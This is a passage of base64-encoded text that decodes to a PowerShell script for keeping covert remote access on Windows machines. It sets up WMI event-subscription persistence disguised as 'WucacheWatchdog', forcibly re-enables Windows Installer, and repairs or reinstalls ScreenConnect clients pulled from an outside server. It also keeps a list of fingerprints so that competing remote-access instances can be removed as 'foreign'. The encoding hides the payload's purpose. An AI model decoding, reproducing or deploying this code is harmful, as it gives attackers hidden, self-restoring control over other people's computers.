Lk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdh
dGNoZG9nQycpIC1vcgogICAgICAgICAgICAgICAgKCRfLlRpbWVySWQgLWVxICdXdWNhY2hlV2F0
Y2hkb2cnKSAtb3IKICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFuZCAkXy5GaWx0ZXIuVG9T
dHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9yCiAgICAgICAgICAgICAgICAo
JF8uQ29uc3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmluZygpIC1saWtlICcqV3VjYWNoZVdh
dGNoZG9nQyonKQogICAgICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB8
IE91dC1OdWxsIH0KICAgIH0KfQoKZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7CiAgICBpZiAo
LW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICAgIFJlbW92ZS1XYXRjaGRvZwogICAg
JG9rID0gJHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIGAKICAg
ICAgICAgICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVy
dmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8IE91dC1O
dWxsCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlw
dGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAgICAgIC1Bcmd1bWVudHMgQHsgTmFt
ZSA9ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3BhY2UgPSAncm9vdFxjaW12Mic7IFF1
ZXJ5TGFuZ3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJT
RUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cn
IiB9CiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlw
dGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGAKICAgICAgICAgICAgLUFyZ3Vt
ZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21tYW5kTGluZVRlbXBsYXRlID0g
ImNtZC5leGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJhY3RpdmVseSA9ICRmYWxzZSB9CiAg
ICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNz
IF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZp
bHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbAogICAgfSBjYXRjaCB7ICRvayA9
ICRmYWxzZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7
CiAgICAkdCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xh
c3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gLUZpbHRlciAiVGltZXJJZD0nV3VjYWNoZVdh
dGNoZG9nJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICRmID0gR2V0LVdtaU9i
amVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1G
aWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0YnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
LUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0
Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICRiID0gJG51bGwKICAg
IGlmICgkZiAtYW5kICRjKSB7CiAgICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5G
aWx0ZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicgLWFuZCAkXy5Db25zdW1lciAtbGlrZSAn
Kld1Y2FjaGVXYXRjaGRvZ0MqJyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAtRmlyc3Qg
MQogICAgfQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRmIC1hbmQgJGMgLWFuZCAkYikKfQoK
ZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsKICAgIGlmIChUZXN0LVdhdGNoZG9nR3JhcGgpIHsg
cmV0dXJuICdPSycgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICdNSVNTSU5HJyB9
CiAgICBpZiAoSW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4gJ1JFQVJNRUQnIH0KICAgIHJldHVy
biAnRkFJTCcKfQoKIyBDb3JyZWN0IDMyLWJpdCArIDY0LWJpdCBBUlAgaGl2ZXMuIEw2IGFuZCBl
YXJsaWVyIHVzZWQgYSB0cnVuY2F0ZWQKIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jv
c29mdFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdAojIHdhcyBpbnZpc2libGUg
dG8gcmVwYWlyL2V4dGVybWluYXRlL3JlZ2lzdGVyZWQuCiRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMg
PSBAKAogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u
XFVuaW5zdGFsbCcsCiAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJwopCgpmdW5jdGlvbiBUZXN0LVNDUmVnaXN0
ZXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBMODogTkVWRVIgdXNlIHJldHVybiBp
bnNpZGUgRm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRzIHRoZQogICAgIyBwaXBlbGluZSBp
dGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nCiAg
ICAjIGFuZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRlZCBoZWFsdGh5IHJlZ2lzdGVyZWQg
c2VydmljZXMuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdubycgfQogICAg
JG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICBmb3JlYWNo
ICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRl
c3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdl
dC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAg
ICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRk
biAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyByZXR1
cm4gJ3llcycgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAnbm8nCn0KCmZ1bmN0aW9uIFJl
cGFpci1TQ1NlcnZpY2UoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgICMgUmVjcmVhdGVzIGEg
ZGVsZXRlZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmluZyB0aGUgUkVHSVNURVJFRCBwcm9k
dWN0LgogICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWlycyBpbiBwbGFjZSAtIGl0IGRvZXMg
Tk9UIHJ1biB0aGUgU0MtZmFtaWx5CiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCwgc28gb3Ro
ZXIgaW5zdGFuY2VzIGFyZSB1bnRvdWNoZWQuCiAgICAjIEw1OiBhbHNvIGhhbmRsZXMgcHJlc2Vu
dC1idXQtU1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJpbmFyaWVzLAogICAgIyB0
aGVuIHN0YXJ0KS4gT25seSBhIFJ1bm5pbmcgc2VydmljZSBpcyBjb25zaWRlcmVkIGhlYWx0aHku
CiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQogICAgJG5hbWUg
PSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAkc3ZjID0gR2V0LVNl
cnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgk
c3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5n
JyB9CiAgICAkZ3VpZCA9ICRudWxsCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5z
dGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGlu
dWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVBy
b3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5
TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5
LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWU7IGJy
ZWFrIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRndWlkKSB7IGJyZWFrIH0KICAgIH0KICAgIGlm
ICgtbm90ICRndWlkKSB7IHJldHVybiAnbm90LXJlZ2lzdGVyZWQnIH0KICAgICYgcmVnLmV4ZSBk
ZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
JyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2Fi
bGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAkbG9nID0gSm9p
bi1QYXRoICRXb3JrRGlyICJtc2lfcmVwYWlyXyRGaW5nZXJwcmludC5sb2ciCiAgICAkcCA9IFN0
YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2ZhICRndWlkIC9xbiAvbm9y
ZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQogICAgU3RhcnQtU2xlZXAgLVNl
Y29uZHMgOAogICAgJiBzYy5leGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91
dC1OdWxsCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVsbAogICAgU3Rh
cnQtU2xlZXAgLVNlY29uZHMgNAogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVz
IC1lcSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQgZXhpdD0kKCRwLkV4aXRDb2Rl
KSIgfQogICAgaWYgKCRzdmMpIHsgcmV0dXJuICJzdmMtc3RpbGwtc3RvcHBlZCBleGl0PSQoJHAu
RXhpdENvZGUpIiB9CiAgICByZXR1cm4gInN2Yy1zdGlsbC1taXNzaW5nIGV4aXQ9JCgkcC5FeGl0
Q29kZSkiCn0KCiMg4pSA4pSAIEdyeXhhIE1VU1QtUlVOIGhlYWx0aCAoTDE2KSDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKIyBMMTY6IE5FVkVSIHJlaW5zdGFsbCB3
aGVuIHNlcnZpY2UgaXMgUnVubmluZyAocGFuZWwgZHVwbGljYXRlcykuCiMgICAgICBUQ1AvcmVs
YXkgYXJlIGFkdmlzb3J5IG9ubHkuIFJlaW5zdGFsbCBvbmx5OiBtaXNzaW5nL3N0b3BwZWQgT1Ig
RlAgZHJpZnQgT1IgLUZvcmNlLgojIEwxNTogZ3J5eGEtaGVhbHRoIC8gZ3J5eGEtZW5zdXJlIOKA
lCA4aCBkZWVwIGNoZWNrIChUQ1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0YWxsKS4KJHNjcmlwdDpH
cnl4YURlZmF1bHRGcCA9ICc5OTA4MTk4ZTY2OGU0NzUwJwokc2NyaXB0OkdyeXhhTXNpVXJsID0g
J2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9l
PUFjY2VzcyZ5PUd1ZXN0Jwokc2NyaXB0OkdyeXhhUmVsYXlIb3N0ID0gJ3VwZGF0ZS5ncnl4YS5j
b20nCiRzY3JpcHQ6R3J5eGFVaUhvc3QgPSAndWkuZ3J5eGEuY29tJwokc2NyaXB0OlNldnJ6S2Vl
cCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCAnZjg2MWM4MTQwZDQ1MzQyNycpCgpmdW5jdGlvbiBH
ZXQtR3J5eGFDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0KCmZ1bmN0
aW9uIEdldC1Hcnl4YUZwIHsKICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAKICAgICRw
ID0gR2V0LUdyeXhhQ2ZnUGF0aAogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsK
ICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15D
VVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9M
b3dlcigpIH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIFNldC1H
cnl4YUZwKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQp
IHsgcmV0dXJuIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGly
KSkgewogICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIg
LUZvcmNlIHwgT3V0LU51bGwKICAgIH0KICAgIEAoCiAgICAgICAgIkNVUlJFTlRfRlA9JCgkRmlu
Z2VycHJpbnQuVG9Mb3dlcigpKSIKICAgICAgICAiUkVMQVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlI
b3N0KSIKICAgICAgICAiVUk9JCgkc2NyaXB0OkdyeXhhVWlIb3N0KSIKICAgICAgICAiTVNJVVJM
PSQoJHNjcmlwdDpHcnl4YU1zaVVybCkiCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRv
VW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykpIgogICAgKSB8IFNldC1Db250ZW50IC1MaXRl
cmFsUGF0aCAoR2V0LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5j
dGlvbiBHZXQtS2VlcEZpbmdlcnByaW50cyB7CiAgICAkc2V0ID0gTmV3LU9iamVjdCAnU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuSGFzaFNldFtzdHJpbmddJyAoW1N0cmluZ0NvbXBhcmVyXTo6
T3JkaW5hbElnbm9yZUNhc2UpCiAgICBbdm9pZF0kc2V0LkFkZCgnNWY2MDEwNTc5ODUyZTUwNycp
CiAgICBbdm9pZF0kc2V0LkFkZCgnZjg2MWM4MTQwZDQ1MzQyNycpCiAgICBbdm9pZF0kc2V0LkFk
ZCgoR2V0LUdyeXhhRnApKQogICAgIyBPNDE6IGFueSBsaXZlL3N0YXJ0aW5nIG5vbi1zZXZyeiBT
QyBpcyBhIGtlZXBlciAobmV2ZXIgZXh0ZXJtaW5hdGUgYXMgZm9yZWlnbikKICAgIGZvcmVhY2gg
KCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90
aW4gQCgnUnVubmluZycsICdTdGFydFBlbmRpbmcnLCAnQ29udGludWVQZW5kaW5nJykpIHsgY29u
dGludWUgfQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCkn
KSB7CiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBp
ZiAoJGZwIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCkgewogICAgICAgICAgICAgICAgW3ZvaWRd
JHNldC5BZGQoJGZwKQogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAgICAgICAgICAg
IH0KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gQCgkc2V0KQp9CgpmdW5jdGlvbiBUZXN0LVRj
cEhvc3RQb3J0KFtzdHJpbmddJEhvc3ROYW1lLCBbaW50XSRQb3J0ID0gNDQzLCBbaW50XSRUaW1l
b3V0TXMgPSA4MDAwKSB7CiAgICBpZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9
CiAgICAkY2xpZW50ID0gJG51bGwKICAgIHRyeSB7CiAgICAgICAgJGNsaWVudCA9IE5ldy1PYmpl
Y3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudAogICAgICAgICRpYXIgPSAkY2xpZW50LkJl
Z2luQ29ubmVjdCgkSG9zdE5hbWUsICRQb3J0LCAkbnVsbCwgJG51bGwpCiAgICAgICAgaWYgKC1u
b3QgJGlhci5Bc3luY1dhaXRIYW5kbGUuV2FpdE9uZSgkVGltZW91dE1zLCAkZmFsc2UpKSB7CiAg
ICAgICAgICAgIHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNhdGNoIHt9CiAgICAgICAgICAgIHJl
dHVybiAkZmFsc2UKICAgICAgICB9CiAgICAgICAgJGNsaWVudC5FbmRDb25uZWN0KCRpYXIpCiAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJGZhbHNlCiAg
ICB9IGZpbmFsbHkgewogICAgICAgIGlmICgkY2xpZW50KSB7IHRyeSB7ICRjbGllbnQuQ2xvc2Uo
KSB9IGNhdGNoIHt9IH0KICAgIH0KfQoKZnVuY3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmdd
JE1zaVBhdGgsIFtzdHJpbmddJFByb3BlcnR5TmFtZSkgewogICAgaWYgKC1ub3QgKFRlc3QtUGF0
aCAtTGl0ZXJhbFBhdGggJE1zaVBhdGgpKSB7IHJldHVybiAkbnVsbCB9CiAgICB0cnkgewogICAg
ICAgICRpbnN0YWxsZXIgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93c0luc3RhbGxlci5J
bnN0YWxsZXIKICAgICAgICAkZGIgPSAkaW5zdGFsbGVyLk9wZW5EYXRhYmFzZSgoUmVzb2x2ZS1Q
YXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkKICAgICAgICAkdmlldyA9ICRkYi5P
cGVuVmlldygiU0VMRUNUIGBWYWx1ZWAgRlJPTSBgUHJvcGVydHlgIFdIRVJFIGBQcm9wZXJ0eWA9
JyRQcm9wZXJ0eU5hbWUnIikKICAgICAgICAkdmlldy5FeGVjdXRlKCkgfCBPdXQtTnVsbAogICAg
ICAgICRyZWMgPSAkdmlldy5GZXRjaCgpCiAgICAgICAgaWYgKC1ub3QgJHJlYykgeyByZXR1cm4g
JG51bGwgfQogICAgICAgIHJldHVybiBbc3RyaW5nXSRyZWMuU3RyaW5nRGF0YSgxKQogICAgfSBj
YXRjaCB7CiAgICAgICAgcmV0dXJuICRudWxsCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1GcEZyb21Q
cm9kdWN0TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgewogICAgaWYgKCRQcm9kdWN0TmFtZSAt
bWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdLlRvTG93
ZXIoKSB9CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rpb24gRmluZC1Qcm9kdWN0R3VpZChbc3Ry
aW5nXSRGaW5nZXJwcmludCkgewogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRG
aW5nZXJwcmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3Rz
KSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAg
ICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRr
ZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAg
ICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGRO
YW1lIC1saWtlICd7Kn0nKSkgewogICAgICAgICAgICAgICAgcmV0dXJuICRrZXkuUFNDaGlsZE5h
bWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5j
dGlvbiBUZXN0LUdyeXhhUmVsYXlDb25maWd1cmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAg
ICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRkaXJz
ID0gQCgKICAgICAgICAoSm9pbi1QYXRoICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiKSwKICAgICAgICAoSm9pbi1QYXRoICRlbnY6
UHJvZ3JhbUZpbGVzICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpCiAgICAp
CiAgICAkcGF0dGVybnMgPSBAKCd1cGRhdGUuZ3J5eGEuY29tJywgJ3VpLmdyeXhhLmNvbScsICdn
cnl4YS5jb20nKQogICAgZm9yZWFjaCAoJGQgaW4gJGRpcnMpIHsKICAgICAgICBpZiAoLW5vdCAo
VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgY29udGludWUgfQogICAgICAgICRmaWxlcyA9
IEAoR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGQgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCA2MCkKICAgICAgICBmb3JlYWNoICgk
ZiBpbiAkZmlsZXMpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkcGF0dGVybnMpIHsK
ICAgICAgICAgICAgICAgIGlmIChTZWxlY3QtU3RyaW5nIC1MaXRlcmFsUGF0aCAkZi5GdWxsTmFt
ZSAtUGF0dGVybiAkcGF0IC1TaW1wbGVNYXRjaCAtUXVpZXQgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRydWUKICAgICAgICAgICAg
ICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYg
KCRmLkxlbmd0aCAtZ3QgMk1CKSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICRieXRlcyA9
IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZi5GdWxsTmFtZSkKICAgICAgICAgICAg
ICAgICR0ZXh0ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJ5
dGVzKQogICAgICAgICAgICAgICAgaWYgKCR0ZXh0IC1tYXRjaCAnZ3J5eGFcLmNvbScpIHsgcmV0
dXJuICR0cnVlIH0KICAgICAgICAgICAgICAgICR0ZXh0OCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGlu
Z106OlVURjguR2V0U3RyaW5nKCRieXRlcykKICAgICAgICAgICAgICAgIGlmICgkdGV4dDggLW1h
dGNoICdncnl4YVwuY29tJykgeyByZXR1cm4gJHRydWUgfQogICAgICAgICAgICB9IGNhdGNoIHt9
CiAgICAgICAgfQogICAgfQogICAgJGltZyA9IChHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNU
RU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcJG5hbWUiIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlKS5JbWFnZVBhdGgKICAgIGlmICgkaW1nIC1hbmQgKCRpbWcgLW1hdGNoICdncnl4
YVwuY29tJykpIHsgcmV0dXJuICR0cnVlIH0KICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRGaW5n
ZXJwcmludCkgeyByZXR1cm4gJHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBU
ZXN0LVNjUnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdl
cnByaW50KSB7IHJldHVybiAkZmFsc2UgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgIHJldHVybiBbYm9vbF0oJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVu
bmluZycpCn0KCmZ1bmN0aW9uIFRlc3QtU2NEaXIoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAg
IGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dy
YW1GaWxlcykpIHsKICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRo
ICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpKSB7IHJldHVybiAk
